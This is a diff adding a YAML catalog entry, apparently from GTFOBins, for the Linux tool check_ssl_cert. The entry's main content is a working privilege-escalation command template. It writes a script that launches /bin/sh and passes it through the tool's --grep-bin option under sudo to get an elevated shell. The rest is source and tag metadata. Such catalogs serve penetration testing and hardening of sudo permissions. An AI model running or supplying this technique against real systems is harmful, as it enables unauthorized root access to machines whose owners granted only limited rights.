@@ -1,0 +1,29 @@
+id: gtfobins/check_ssl_cert/shell/sudo
+type: binary
+platform: linux
+name: check_ssl_cert
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''exec /bin/sh 0<&2 1>&2'' >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    check_ssl_cert --grep-bin /path/to/temp-file -H x'
+  comment: The shell will be invoked multiple times.
+references:
+- https://gtfobins.github.io/gtfobins/check_ssl_cert/
+tags:
+- linux
+- unix
+- gtfobins
